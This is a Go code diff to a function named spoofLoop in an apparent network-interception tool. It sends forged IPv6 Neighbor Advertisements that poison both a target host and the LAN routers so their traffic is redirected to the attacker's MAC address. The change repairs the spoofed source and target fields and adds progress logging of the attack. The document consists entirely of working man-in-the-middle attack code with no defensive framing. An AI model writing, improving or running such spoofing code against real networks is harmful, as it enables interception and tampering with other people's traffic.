@@ -70,7 +70,6 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 
 		// Attack when we have the router LLA only
 		if h.Router != nil {
-			srcAddr := packet.Addr{IP: h.Router.Addr.IP, MAC: h.session.NICInfo.RouterMAC}
 			list := []packet.Addr{}
 			for _, router := range h.LANRouters {
 				list = append(list, router.Addr)
@@ -81,17 +80,20 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 			for _, routerAddr := range list {
 				// spoof host
 				//
-				if err := h.SendNeighborAdvertisement(routerAddr, dstAddr, h.session.NICInfo.HostMAC); err != nil {
+				host := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: h.session.NICInfo.HostLLA.IP}
+				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: routerAddr.IP}
+				if err := h.SendNeighborAdvertisement(host, dstAddr, targetAddr); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
 
 				if nTimes%16 == 0 {
-					fmt.Printf("icmp6 : attack src %s dst %s repeat=%v duration=%v\n", srcAddr, dstAddr, nTimes, time.Since(startTime))
+					fmt.Printf("icmp6 : attack src %s dst %s target %s repeat=%v duration=%v\n", host, dstAddr, targetAddr, nTimes, time.Since(startTime))
 				}
 				nTimes++
 
 				// spoof router
-				if err := h.SendNeighborAdvertisement(dstAddr, routerAddr, h.session.NICInfo.HostMAC); err != nil {
+				targetAddr.IP = dstAddr.IP
+				if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
 			}
